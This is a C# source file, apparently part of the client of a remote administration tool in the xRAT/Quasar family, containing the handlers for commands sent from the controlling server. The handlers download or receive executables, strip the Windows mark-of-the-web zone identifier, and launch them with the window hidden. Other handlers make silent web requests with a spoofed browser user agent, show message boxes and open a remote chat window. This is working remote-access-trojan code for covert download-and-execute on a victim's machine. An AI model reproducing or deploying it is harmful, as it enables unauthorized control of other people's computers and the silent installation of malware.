using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
    public static partial class CommandHandler
    {
        public static void HandleDoDownloadAndExecute(Packets.ServerPackets.DoDownloadAndExecute command,
            Client client)
        {
            new Packets.ClientPackets.SetStatus("Downloading file...").Execute(client);

            new Thread(() =>
            {
                string tempFile = FileHelper.GetTempFilePath(".exe");

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.URL, tempFile);
                    }
                }
                catch
                {
                    new Packets.ClientPackets.SetStatus("Download failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.SetStatus("Downloaded File!").Execute(client);

                try
                {
                    FileHelper.DeleteZoneIdentifier(tempFile);

                    var bytes = File.ReadAllBytes(tempFile);
                    if (!FileHelper.IsValidExecuteableFile(bytes))
                        throw new Exception("no pe file");

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = false;
                    startInfo.FileName = tempFile;
                    Process.Start(startInfo);
                }
                catch
                {
                    NativeMethods.DeleteFile(tempFile);
                    new Packets.ClientPackets.SetStatus("Execution failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.SetStatus("Executed File!").Execute(client);
            }).Start();
        }

        public static void HandleDoUploadAndExecute(Packets.ServerPackets.DoUploadAndExecute command, Client client)
        {
            if (!_renamedFiles.ContainsKey(command.ID))
                _renamedFiles.Add(command.ID, FileHelper.GetTempFilePath(Path.GetExtension(command.FileName)));

            string filePath = _renamedFiles[command.ID];

            try
            {
                if (command.CurrentBlock == 0 && Path.GetExtension(filePath) == ".exe" && !FileHelper.IsValidExecuteableFile(command.Block))
                    throw new Exception("No executable file");

                FileSplit destFile = new FileSplit(filePath);

                if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                    throw new Exception(destFile.LastError);

                if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                {
                    if (_renamedFiles.ContainsKey(command.ID))
                        _renamedFiles.Remove(command.ID);

                    FileHelper.DeleteZoneIdentifier(filePath);

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = false;
                    startInfo.FileName = filePath;
                    Process.Start(startInfo);

                    new Packets.ClientPackets.SetStatus("Executed File!").Execute(client);
                }
            }
            catch (Exception ex)
            {
                if (_renamedFiles.ContainsKey(command.ID))
                    _renamedFiles.Remove(command.ID);
                NativeMethods.DeleteFile(filePath);
                new Packets.ClientPackets.SetStatus(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleDoVisitWebsite(Packets.ServerPackets.DoVisitWebsite command, Client client)
        {
            string url = command.URL;

            if (!url.StartsWith("http"))
                url = "http://" + url;

            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                if (!command.Hidden)
                    Process.Start(url);
                else
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                        request.UserAgent =
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
                        request.AllowAutoRedirect = true;
                        request.Timeout = 10000;
                        request.Method = "GET";

                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                        {
                        }
                    }
                    catch
                    {
                    }
                }

                new Packets.ClientPackets.SetStatus("Visited Website").Execute(client);
            }
        }

        public static void HandleDoShowMessageBox(Packets.ServerPackets.DoShowMessageBox command, Client client)
        {
            new Thread(() =>
            {
                MessageBox.Show(command.Text, command.Caption,
                    (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton),
                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon),
                    MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
            }).Start();

            new Packets.ClientPackets.SetStatus("Showed Messagebox").Execute(client);
        }

        public static void HandleDoChatStart(Client client, Packets.ServerPackets.DoChatStart packet)
        {
           var frmChat = new xClient.Forms.FrmRemoteChat(client);
            new Thread(() => {
                Application.Run(frmChat);
            }).Start();
        }

        public static void HandleDoChatMessage(Client client, Packets.ServerPackets.DoChatMessage packet)
        {
            var frmChat = (xClient.Forms.FrmRemoteChat)Application.OpenForms["FrmRemoteChat"];
            if(frmChat != null)
                frmChat.AddMessage("Him", packet.Message);
        }

        public static void HandleDoChatStop(Client client, Packets.ServerPackets.DoChatStop packet)
        {
            var frmChat = (xClient.Forms.FrmRemoteChat)Application.OpenForms["FrmRemoteChat"];
            if (frmChat != null)
                CloseChatForm();
        }

        public static void CloseChatForm()
        {
            var frmChat = (xClient.Forms.FrmRemoteChat)Application.OpenForms["FrmRemoteChat"];
            if(frmChat != null)
            {
                frmChat.Active = false;
                frmChat.Close();
            }
        }
    }
}